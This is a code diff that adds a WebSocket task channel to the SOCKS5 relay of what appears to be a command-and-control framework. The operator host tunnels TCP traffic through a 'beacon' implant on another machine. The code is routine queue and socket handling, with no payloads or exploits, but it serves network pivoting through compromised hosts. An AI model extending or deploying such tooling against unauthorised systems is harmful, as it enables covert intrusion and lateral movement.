@@ -1,7 +1,9 @@
 """
-SOCKS5 listener on the operator host; TCP is relayed through the beacon via /socks.
+SOCKS5 listener on the operator host; TCP is relayed through the beacon.
 
-Client workflow: dedicated runspace polls GET/POST /socks only (main beacon unchanged).
+Agent transport (main /cmd beacon unchanged):
+  - WebSocket GET /socks-ws (push tasks, low latency) when supported
+  - HTTP GET/POST /socks (poll fallback)
 """
 
 from __future__ import annotations
@@ -47,6 +49,8 @@ class SessionSocksBridge:
         self._listener_sock: socket.socket | None = None
         self._accept_thread: threading.Thread | None = None
         self._running = False
+        self._agent_ws: Any = None
+        self._agent_ws_lock = threading.Lock()
 
     def log(self, msg: str, level: str = "INFO"):
         self.on_log(msg, level)
@@ -71,6 +75,49 @@ class SessionSocksBridge:
             "SUCCESS",
         )
 
+    def agent_ws_connected(self) -> bool:
+        with self._agent_ws_lock:
+            ws = self._agent_ws
+        return ws is not None and not ws.closed
+
+    def attach_agent_ws(self, ws: Any) -> None:
+        """Register agent WebSocket; push queued tasks and stream new tasks over WS."""
+        with self._agent_ws_lock:
+            old = self._agent_ws
+            self._agent_ws = ws
+        if old and old is not ws:
+            try:
+                old.close()
+            except Exception:
+                pass
+        with self.lock:
+            snapshot = list(self.task_queue)
+        try:
+            ws.send_json({"op": "active", "active": True})
+            if snapshot:
+                ws.send_json({"op": "tasks", "tasks": snapshot})
+        except Exception:
+            self.detach_agent_ws(ws)
+
+    def detach_agent_ws(self, ws: Any) -> None:
+        with self._agent_ws_lock:
+            if self._agent_ws is ws:
+                self._agent_ws = None
+
+    def _push_tasks_ws(self, tasks: list[dict[str, Any]]) -> bool:
+        if not tasks:
+            return True
+        with self._agent_ws_lock:
+            ws = self._agent_ws
+        if not ws or ws.closed:
+            return False
+        try:
+            ws.send_json({"op": "tasks", "tasks": tasks})
+            return True
+        except Exception:
+            self.detach_agent_ws(ws)
+            return False
+
     def stop(self) -> None:
         with self.lock:
             self._running = False
@@ -82,6 +129,18 @@ class SessionSocksBridge:
             self.connect_events.clear()
             self.connect_errors.clear()
             self._pending_sends.clear()
+        with self._agent_ws_lock:
+            aws = self._agent_ws
+            self._agent_ws = None
+        if aws:
+            try:
+                aws.send_json({"op": "active", "active": False})
+            except Exception:
+                pass
+            try:
+                aws.close()
+            except Exception:
+                pass
         for t in tunnels:
             self._close_tunnel(t, notify_client=False)
         ls = self._listener_sock
@@ -126,6 +185,7 @@ class SessionSocksBridge:
                     self._pending_sends[cid].append(task)
                     return
             self.task_queue.append(task)
+        self._push_tasks_ws([task])
 
     def _drop_tasks(self, conn_id: str, op: str) -> None:
         with self.lock:
@@ -143,6 +203,9 @@ class SessionSocksBridge:
 
     def fetch_tasks(self) -> list[dict[str, Any]]:
         """Return pending tasks. Send tasks are delivered once; connect until POST ack."""
+        with self._agent_ws_lock:
+            if self._agent_ws and not self._agent_ws.closed:
+                return []
         with self.lock:
             outbound: list[dict[str, Any]] = []
             keep: deque[dict[str, Any]] = deque()
@@ -409,6 +472,27 @@ class SocksManager:
         except json.JSONDecodeError:
             return False
         responses = data.get("responses")
+        if not isinstance(responses, list):
+            return False
+        bridge.submit_responses(responses)
+        return True
+
+    def attach_agent_ws(self, session_id: str, ws: Any) -> bool:
+        bridge = self.get(session_id)
+        if not bridge:
+            return False
+        bridge.attach_agent_ws(ws)
+        return True
+
+    def detach_agent_ws(self, session_id: str, ws: Any) -> None:
+        bridge = self.get(session_id)
+        if bridge:
+            bridge.detach_agent_ws(ws)
+
+    def submit_agent_responses(self, session_id: str, responses: list) -> bool:
+        bridge = self.get(session_id)
+        if not bridge:
+            return True
         if not isinstance(responses, list):
             return False
         bridge.submit_responses(responses)
